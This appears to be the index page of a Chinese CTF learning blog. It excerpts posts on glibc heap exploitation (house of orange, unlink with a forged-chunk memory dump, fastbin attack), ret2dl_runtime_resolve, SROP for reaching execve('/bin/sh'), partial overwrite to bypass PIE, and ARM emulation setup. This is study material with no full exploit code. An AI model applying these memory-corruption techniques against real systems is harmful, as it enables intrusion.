<h3 id="对于house-of-orange操作的理解（glibc2-23）"><a href="#对于house-of-orange操作的理解（glibc2-23）" class="headerlink" title="对于house of orange操作的理解（glibc2.23）"></a>对于house of orange操作的理解（glibc2.23）</h3><p>大体上是，没有<font color="red">free</font>函数，通过<font color="red">改写top chunk</font>，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。</p>
        
          <a class="article-more-link" href="/2020/03/10/house-of-orange/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/10/house-of-orange/" data-id="ckdbq6hh80004sgswjrhgiuyu"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-unlink" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2020/02/18/unlink/">unlink</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/02/18/unlink/" class="article-date">
  <time datetime="2020-02-18T14:44:29.000Z" itemprop="datePublished">2020-02-18</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>把ctf wiki里的unlink题简单的做了一下<br>先简单的记录一下，以后吃透了再回来好好的填填坑</p>
<p>理解了一下unlink的操作<br>就是构造一个chunk，例如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1302000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x1302010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000040</span>  <span class="comment">#fack_chunk（构造成一个free掉的样子）  0x51的chunk，就在他下面构造一个刚好可以填满这个chunk的new chunk，即-0x11</span></span><br><span class="line"><span class="number">0x1302020</span>:	<span class="number">0x00000000006030d0</span>	<span class="number">0x00000000006030d8</span></span><br><span class="line"><span class="number">0x1302030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1302040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x1302050</span>:	<span class="number">0x0000000000000040</span>	<span class="number">0x00000000000000a0</span>  <span class="comment">#p位改成0，free下一个chunk之后会与上一个chunk合并</span></span><br><span class="line"><span class="number">0x1302060</span>:	<span class="number">0x654420746f626f52</span>	<span class="number">0x00000000006c6976</span></span><br><span class="line"><span class="number">0x1302070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1302080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x1302090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x13020f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f11</span></span><br></pre></td></tr></table></figure>
        
          <a class="article-more-link" href="/2020/02/18/unlink/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/18/unlink/" data-id="ckdbq6hhz000fsgswgqju3j31"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-arm的环境搭建-简单的例题" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2020/02/07/arm的环境搭建-简单的例题/">arm的环境搭建+简单的例题</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/02/07/arm的环境搭建-简单的例题/" class="article-date">
  <time datetime="2020-02-07T14:54:19.000Z" itemprop="datePublished">2020-02-07</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>关于arm的东西我好像已经拖了将近一个月了，不能再拖下去了，先记一些吧，之后我陆续补坑看看</p>
<h2 id="arm环境搭建"><a href="#arm环境搭建" class="headerlink" title="arm环境搭建"></a>arm环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装qemu</span><br><span class="line">apt-get install qemu</span><br><span class="line">#更新一下</span><br><span class="line">sudo apt-get update</span><br><span class="line">#安装32位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-arm-linux-gnueabi</span><br><span class="line">#运行32位的动态链接程序方法</span><br><span class="line">qemu-arm -L /usr/arm-linux-gnueabi ./文件</span><br><span class="line">#安装64位的依赖库</span><br><span class="line">sudo apt-get install -y gcc-aarch64-linux-gnu g++-aarch64-linux-gnu</span><br><span class="line">#运行64位的动态链接程序方法</span><br><span class="line">qemu-aarch64 -L /usr/aarch64-linux-gnu ./文件</span><br><span class="line">#安装gdb调试工具</span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br></pre></td></tr></table></figure>
        
          <a class="article-more-link" href="/2020/02/07/arm的环境搭建-简单的例题/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/07/arm的环境搭建-简单的例题/" data-id="ckdbq6hhd0007sgsw1xdnhbi2"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-fastbinin-attack" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2020/02/07/fastbinin-attack/">fastbinin_attack</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/02/07/fastbinin-attack/" class="article-date">
  <time datetime="2020-02-07T13:59:05.000Z" itemprop="datePublished">2020-02-07</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>就把wiki上的三道题稍微看了一下，了解了一下下fastbin attack，但是。。。依旧不算太清醒<br>好了，废话不多说，开始吧</p>
        
          <a class="article-more-link" href="/2020/02/07/fastbinin-attack/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/07/fastbinin-attack/" data-id="ckdbq6hhb0006sgswhczpnyd2"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-runtime-resolve" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2019/10/07/runtime-resolve/">runtime_resolve</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2019/10/07/runtime-resolve/" class="article-date">
  <time datetime="2019-10-07T04:23:05.000Z" itemprop="datePublished">2019-10-07</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>做为高级rop的题目果然是令人很头疼的，这类题目是没有办法leak的（无回显），就借助_dl_runtime_resolve(link_map_obj, reloc_index)对动态链接的函数重定位</p>
<p>控制程序执行 dl_resolve 函数<br>    给定 Link_map 以及 index 两个参数。<br>    当然我们可以直接给定 plt0 对应的汇编代码，这时，我们就只需要一个 index 就足够了。<br>控制 index 的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。<br>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。<br>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</p>
        
          <a class="article-more-link" href="/2019/10/07/runtime-resolve/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/07/runtime-resolve/" data-id="ckdbq6hhu000csgswzjgeltfx"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-srop" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2019/09/02/srop/">srop</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2019/09/02/srop/" class="article-date">
  <time datetime="2019-09-02T15:51:52.000Z" itemprop="datePublished">2019-09-02</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h2 id="Srop"><a href="#Srop" class="headerlink" title="Srop"></a>Srop</h2><p>Srop大概是一种，没有其他函数，找gadget会比较麻烦，无法利用来leak地址，借助signal handle机制’sigreturn’的系统调用，更改signal frame（这是一段代码）的一些寄存器的值做到系统调用，主要相关的寄存器有：rax（系统调用号）、rdi（存参）、rip（下一条指令）、rsp（栈顶），还有就是re_sigreturn（存sigreturn的系统调用号，32 位的 sigreturn 的调用号为 77，64 位的系统调用号为 15）</p>
<p>偷偷搬运一下wiki里的图，这就是一个signal frame，最后执行完sigreturn之后会执行execve（‘/bin/sh’,0,0）<br><img src="/2019/09/02/srop/%E5%9B%BE%E7%89%871.png" alt></p>
        
          <a class="article-more-link" href="/2019/09/02/srop/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/09/02/srop/" data-id="ckdbq6hhw000dsgswreyac0xr"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-playfmt" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2019/08/20/playfmt/">suctf的两三题wp</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2019/08/20/playfmt/" class="article-date">
  <time datetime="2019-08-20T14:58:39.000Z" itemprop="datePublished">2019-08-20</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>这次suctf我参与了的好像就三道题吧，还是和队友以及大佬商讨之后才弄出来的，发现自己真的太菜了</p>
<p>以下附上超级简单题的一些思路，当做给自己的记录吧</p>
        
          <a class="article-more-link" href="/2019/08/20/playfmt/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/20/playfmt/" data-id="ckdbq6hhm000asgswx8uynb85"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
        

<article id="post-overwrite" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h2 itemprop="name">
      <a class="article-title" href="/2019/08/16/overwrite/">partial overwrite</a>
    </h2>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2019/08/16/overwrite/" class="article-date">
  <time datetime="2019-08-16T07:00:49.000Z" itemprop="datePublished">2019-08-16</time>
</a>
        
      </div>
    

    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h2 id="partial-overwrite"><a href="#partial-overwrite" class="headerlink" title="partial overwrite"></a>partial overwrite</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护。<br>（对于绕过PIE的操作我是没怎么接触过的）<br>大概就是用字节覆盖修改地址，使程序跳转到我们想用的函数上去</p>
        
          <a class="article-more-link" href="/2019/08/16/overwrite/">Read More...</a>
        
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/08/16/overwrite/" data-id="ckdbq6hhr000bsgswcngg8wyw"
         class="article-share-link">Share</a>
      
    </footer>

  </div>

  

  

</article>



      
  </article>
  

  
    <nav class="page-nav">
      
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next page</a>
    </nav>
  
</section>
</div>

  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

  <aside class="sidebar">
    
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/gallery">Gallery</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/ocean.js"></script>

</body>
</html>